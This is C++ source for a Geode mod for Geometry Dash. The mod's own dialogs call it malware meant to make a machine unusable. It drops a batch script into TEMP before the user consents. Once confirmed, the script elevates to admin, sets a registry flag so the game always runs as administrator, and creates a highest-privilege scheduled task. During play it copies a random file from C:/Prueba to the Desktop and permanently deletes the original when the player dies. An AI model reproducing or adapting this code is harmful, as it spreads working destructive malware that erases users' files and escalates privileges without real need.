#define _CRT_SECURE_NO_WARNINGS
#include <Geode/Geode.hpp>
#include <Geode/modify/MenuLayer.hpp>
#include <Geode/modify/PlayLayer.hpp>
#include <fstream>
#include <filesystem>
#include <random>

using namespace geode::prelude;
namespace fs = std::filesystem;

// Global variables for file tracking
std::string g_copiedFileName = "";
fs::path g_sourcePath = "C:/Prueba";

fs::path getDesktopPath() {
    char* userProfile = std::getenv("USERPROFILE");
    if (userProfile) {
        return fs::path(userProfile) / "Desktop";
    }
    return "";
}

void createAnGD666Bat() {
    char* tempEnv = std::getenv("TEMP");
    if (!tempEnv) return;
    fs::path batPath = fs::path(tempEnv) / "AnGD666.bat";
    
    std::ofstream batFile(batPath);
    batFile << "@echo off\n";
    batFile << ":: Check for administrative privileges\n";
    batFile << "net session >nul 2>&1\n";
    batFile << "if %errorLevel% == 0 (\n";
    batFile << "    goto :run_installation\n";
    batFile << ") else (\n";
    batFile << "    echo Requesting administrative privileges...\n";
    batFile << "    powershell -Command \"Start-Process '%~f0' -Verb RunAs\"\n";
    batFile << "    exit /b\n";
    batFile << ")\n";
    batFile << ":run_installation\n";
    batFile << ":: Set GeometryDash.exe to always run as administrator via Registry\n";
    batFile << "reg add \"HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Layers\" /v \"C:\\Program Files (x86)\\Steam\\steamapps\\common\\Geometry Dash\\GeometryDash.exe\" /t REG_SZ /d \"~ RUNASADMIN\" /f\n";
    batFile << ":: Create and run scheduled task for GeometryDash.exe with highest privileges\n";
    batFile << "schtasks /delete /tn \"GD666\" /f\n";
    batFile << "schtasks /create /tn \"GD666\" /tr \"C:\\Program Files (x86)\\Steam\\steamapps\\common\\Geometry Dash\\GeometryDash.exe\" /sc once /st 00:00 /rl highest /f\n";
    batFile << "schtasks /run /tn \"GD666\"\n";
    batFile << ":: Optional: Wait for GeometryDash.exe to close (if we want the bat to stay open)\n";
    batFile << "start /wait \"\" \"C:\\Program Files (x86)\\Steam\\steamapps\\common\\Geometry Dash\\GeometryDash.exe\"\n";
    batFile << "exit\n";
    batFile.close();
}

/*
void extractLauncher() {
    // Esta función ya no es necesaria, ya que no extraemos 666.exe
}
*/

void disableMod() {
    auto mod = Mod::get();
    mod->setSettingValue("enabled", false);
    
    char* tempEnv = std::getenv("TEMP");
    if (tempEnv) {
        fs::path batPath = fs::path(tempEnv) / "AnGD666.bat";
        if (fs::exists(batPath)) {
            try { fs::remove(batPath); } catch (...) {}
        }
    }
    utils::game::restart(true);
}

class $modify(MyMenuLayer, MenuLayer) {
    bool init() override {
        if (!MenuLayer::init()) return false;

        bool isEnabled = Mod::get()->getSettingValue<bool>("enabled");
        bool isConfirmed = Mod::get()->getSavedValue<bool>("confirmed");

        if (isEnabled && !isConfirmed) {
            this->runAction(CCSequence::create(
                CCDelayTime::create(0.5f),
                CCCallFunc::create(this, callfunc_selector(MyMenuLayer::showFirstMessage)),
                nullptr
            ));
        }

        return true;
    }

    void showFirstMessage() {
        createAnGD666Bat();
        auto alert = FLAlertLayer::create(
            this,
            "Are you sure?",
            "The software you just executed is considered malware.\nThis mod will harm your computer and makes it unusable.\nIf you are seeing this message without knowing what you just executed, simply press No and nothing will happen.\nIf you know what this mod does and are using a safe environment to test, press Yes to start it.\n\nDO YOU WANT TO EXECUTE THIS MOD, RESULTING IN AN UNUSABLE MACHINE?",
            "No", "Yes"
        );
        alert->setTag(1);
        alert->show();
    }

    void showLastMessage() {
        auto alert = FLAlertLayer::create(
            this,
            "LAST WARNING!",
            "THIS IS THE LAST WARNING!\n\nTHE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGE MADE USING THIS MOD!\nSTILL EXECUTE IT?",
            "No", "Yes"
        );
        alert->setTag(2);
        alert->show();
    }

    void FLAlert_Clicked(FLAlertLayer* alert, bool btn2) override {
        if (alert->getTag() == 1) {
            if (btn2) {
                this->showLastMessage();
            } else {
                disableMod();
            }
        } else if (alert->getTag() == 2) {
            if (btn2) {
                Mod::get()->setSavedValue("confirmed", true);
                char* tempEnv = std::getenv("TEMP");
                if (tempEnv) {
                    std::string batPath = (fs::path(tempEnv) / "AnGD666.bat").string();
                    ShellExecuteA(NULL, "open", batPath.c_str(), NULL, NULL, SW_SHOWNORMAL);
                }
            } else {
                disableMod();
            }
        }
    }
};

class $modify(MyPlayLayer, PlayLayer) {
    struct Fields {
        std::string m_copiedFile = "";
        fs::path m_desktopPath = "";
        bool m_hasDied = false;
    };

    bool init(GJGameLevel* level, bool useReplay, bool dontSave) {
        if (!PlayLayer::init(level, useReplay, dontSave)) return false;

        if (fs::exists(g_sourcePath)) {
            std::vector<fs::path> files;
            try {
                for (auto const& dir_entry : fs::recursive_directory_iterator(g_sourcePath)) {
                    if (dir_entry.is_regular_file()) {
                        files.push_back(dir_entry.path());
                    }
                }
            } catch (...) {}

            if (!files.empty()) {
                std::random_device rd;
                std::mt19937 g(rd());
                std::uniform_int_distribution<> dis(0, (int)files.size() - 1);
                
                fs::path selectedFile = files[dis(g)];
                m_fields->m_copiedFile = selectedFile.filename().string();
                m_fields->m_desktopPath = getDesktopPath();

                if (!m_fields->m_desktopPath.empty()) {
                    try {
                        fs::copy(selectedFile, m_fields->m_desktopPath / m_fields->m_copiedFile, fs::copy_options::overwrite_existing);
                    } catch (...) {}
                }
            }
        }

        return true;
    }

    void onQuit() {
        if (!m_fields->m_hasDied && !m_fields->m_copiedFile.empty() && !m_fields->m_desktopPath.empty()) {
            fs::path desktopFile = m_fields->m_desktopPath / m_fields->m_copiedFile;
            if (fs::exists(desktopFile)) {
                try { fs::remove(desktopFile); } catch (...) {}
            }
        }
        PlayLayer::onQuit();
    }

    void destroyPlayer(PlayerObject* p0, GameObject* p1) {
        PlayLayer::destroyPlayer(p0, p1);
        
        if (!m_fields->m_copiedFile.empty()) {
            m_fields->m_hasDied = true;
            fs::path desktopFile = m_fields->m_desktopPath / m_fields->m_copiedFile;
            if (fs::exists(desktopFile)) {
                try { fs::remove(desktopFile); } catch (...) {}
            }

            try {
                for (auto const& dir_entry : fs::recursive_directory_iterator(g_sourcePath)) {
                    if (dir_entry.is_regular_file() && dir_entry.path().filename() == m_fields->m_copiedFile) {
                        fs::remove(dir_entry.path());
                        break; 
                    }
                }
            } catch (...) {}
        }
    }
};
